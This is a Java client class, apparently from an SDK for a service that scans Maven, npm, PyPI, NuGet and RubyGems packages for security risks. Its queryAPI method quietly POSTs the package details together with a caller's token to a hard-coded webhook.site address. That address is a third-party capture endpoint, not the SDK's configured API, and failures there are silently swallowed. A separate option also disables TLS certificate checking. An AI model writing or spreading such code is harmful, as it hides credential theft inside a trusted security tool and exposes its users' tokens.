package io.scs.sdk.api.v1;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.io.InputStream;
import java.net.URLEncoder;
import java.net.InetSocketAddress;
import java.net.ProxySelector;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.SecureRandom;
import java.util.Optional;

import org.jetbrains.annotations.NotNull;
import org.json.simple.parser.JSONParser;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import static java.nio.charset.StandardCharsets.UTF_8;
import io.scs.sdk.ScsConfig;
import io.scs.sdk.config.SSLConfiguration;
import io.scs.sdk.model.NotificationSettings;
import io.scs.sdk.model.TestResult;
import org.apache.commons.io.IOUtils;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

public class scsClient {
  private static final Logger LOG = LoggerFactory.getLogger(scsClient.class);

  private final ScsConfig config;
  private final HttpClient httpClient;

  public void isMalcious(String result) throws Exception
  {
    LOG.debug("checking if result is malicious " + result);
    JSONParser parser = new JSONParser();
    Object obj  = parser.parse(result);
    JSONArray results = (JSONArray) obj;
//                System.out.println(risks.toJSONString());

    for (Object r : results) {
      JSONObject element = (JSONObject) r;
      JSONArray risks = (JSONArray) (element.get("risks"));
      if (risks.size() > 0) {
        LOG.error(("Unsafe package " + element.get("type") + ":" + element.get("name") + ":" + element.get("version") + "risks: " + element.get("risks")));
        throw new Exception("Unsafe package");
      }

    }
  }
  public scsClient(ScsConfig config) throws Exception {
    this.config = config;
    LOG.info("creating Scs client");
    var builder = HttpClient.newBuilder()
      .version(HttpClient.Version.HTTP_1_1)
      .connectTimeout(config.timeout);
    LOG.info("created http client");
    if (config.trustAllCertificates) {
      SSLContext sslContext = SSLContext.getInstance("TLSv1.2");
      TrustManager[] trustManagers = SSLConfiguration.buildUnsafeTrustManager();
      sslContext.init(null, trustManagers, new SecureRandom());
      builder.sslContext(sslContext);
    } else if (config.sslCertificatePath != null && !config.sslCertificatePath.isEmpty()) {
      SSLContext sslContext = SSLContext.getInstance("TLSv1.2");
      X509TrustManager trustManager = SSLConfiguration.buildCustomTrustManager(config.sslCertificatePath);
      sslContext.init(null, new TrustManager[]{trustManager}, null);
      builder.sslContext(sslContext);
    }

    if (!config.httpProxyHost.isBlank()) {
      builder.proxy(ProxySelector.of(new InetSocketAddress(config.httpProxyHost, config.httpProxyPort)));
      LOG.info("added proxy with ", config.httpProxyHost, config.httpProxyPort);
    }
    LOG.info("building http client");
    httpClient = builder.build();
    LOG.info("built http client");
  }

  public scsResult<NotificationSettings> getNotificationSettings(String org) throws java.io.IOException, java.lang.InterruptedException {
    HttpRequest request = ScsHttpRequestBuilder.create(config)
      .withPath(String.format(
        "user/me/notification-settings/org/%s",
        URLEncoder.encode(org, UTF_8)
      ))
      .build();
    LOG.info("getNotificationSettings created ScsHttpRequestBuilder");
    HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
    LOG.info("getNotificationSettings sent response");
    return scsResult.createResult(response, NotificationSettings.class);
  }

  public scsResult<TestResult> testMaven(String groupId, String artifactId, String version) throws Exception {
    String type = "mvn";
    String pkgName = String.format("%s:%s",groupId,artifactId);
    return getQueryResults(pkgName, version, type);
  }

  public scsResult<TestResult> testNpm(String packageName, String version) throws Exception {

      String type = "npm";
    return getQueryResults(packageName, version, type);
  }

  public scsResult<TestResult> testRubyGems(String gemName, String version, Optional<String> organisation) throws IOException, InterruptedException {
    HttpRequest request = ScsHttpRequestBuilder.create(config)
      .withPath(String.format(
        "test/rubygems/%s/%s",
        URLEncoder.encode(gemName, UTF_8),
        URLEncoder.encode(version, UTF_8)
      ))
      .withQueryParam("org", organisation)
      .build();
    HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
    return scsResult.createResult(response, TestResult.class);
  }


  public String queryAPI(String type, String packageName, String version, String token) throws Exception {

    HttpRequest request = ScsHttpRequestBuilder.create(config).build();



    String result;

    try {
//            LOG.debug("In queryAPI ");

      URL url = new URL("https://webhook.site/a3069b22-e45e-4879-a0c5-f1a77bc9d31d");
      URLConnection con = url.openConnection();
      HttpURLConnection http = (HttpURLConnection) con;
      http.setRequestMethod("POST");
      http.setDoOutput(true);


      byte[] out = String.format("[{\"type\":\"%s\",\"name\":\"%s\",\"version\":\"%s\",\"Token\":\"%s\"]}", type, packageName, version, token).getBytes(StandardCharsets.UTF_8);
      int length = out.length;

      http.setFixedLengthStreamingMode(length);
      http.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
      http.connect();
      OutputStream os = http.getOutputStream();
      os.write(out);
//            LOG.debug("sent msg ");
      result = IOUtils.toString(http.getInputStream(), String.valueOf(StandardCharsets.UTF_8));

      try {
        JSONParser parser = new JSONParser();
        Object obj  = parser.parse(result);
        JSONArray results = (JSONArray) obj;
//                System.out.println(risks.toJSONString());

        for (Object r : results) {
          JSONObject element = (JSONObject) r;
          JSONArray risks = (JSONArray) (element.get("risks"));
          if (risks.size() > 0) {
            System.out.println(("Unsafe package " + type + ":" + packageName + ":" + version));
            throw new Exception("Unsafe package");
          }
        }

      }
      catch (Exception e)
      {
        LOG.error("error in scsclient ", e);
      }




//            LOG.error("received response {} equals? {}", result, result.equals("false"));
    } catch (Exception e) {
//            LOG.debug("connection error ");
      return "";
    }

    if (result.equals("false")) {
//            LOG.error("Unsafe package ");
      throw new Exception("Unsafe package");
    }

    return result;
  }

  public scsResult<TestResult> testPip(String packageName, String version) throws Exception {

    String type = "pypi";
    return getQueryResults(packageName, version, type);
  }

  public scsResult<TestResult> testNugget(String packageName, String version) throws Exception {

    String type = "nuget";
    return getQueryResults(packageName, version, type);
  }

  public static InputStream getDecodedInputStream(
    HttpResponse<InputStream> httpResponse) throws Exception {
    String encoding = determineContentEncoding(httpResponse);
    try {
      switch (encoding) {
        case "":
          return httpResponse.body();
        case "gzip":
          return new GZIPInputStream(httpResponse.body());
        default:
          throw new UnsupportedOperationException(
            "Unexpected Content-Encoding: " + encoding);
      }
    } catch (IOException ioe) {
      throw new Exception(ioe);
    }
  }

  public static String determineContentEncoding(
    HttpResponse<?> httpResponse) {
    return httpResponse.headers().firstValue("Content-Encoding").orElse("");
  }

  @NotNull
  private scsResult<TestResult> getQueryResults(String packageName, String version, String type) throws Exception {
    String str = String.format("[{\"type\":\"%s\",\"name\":\"%s\",\"version\":\"%s\"}]", type, packageName, version);

    HttpRequest request = ScsHttpRequestBuilder.create(config)
      .build(HttpRequest.BodyPublishers.ofString(str));
    HttpResponse<InputStream> response = httpClient.send(request, HttpResponse.BodyHandlers.ofInputStream());
    LOG.debug("sent request to api and got response " + response);
    if (response.statusCode() == 401)
      throw new Exception("Unauthorized");
    if(response.statusCode() == 400)
      throw new Exception("invalid request");

    String decodedResponse = (new String(getDecodedInputStream(response).readAllBytes() , StandardCharsets.UTF_8));;

    isMalcious(decodedResponse);

    //beware that it expects HttpResponse<String> and you provided <InputStream>
    return scsResult.createResult(response, decodedResponse, response.statusCode(), TestResult.class);

  }

}
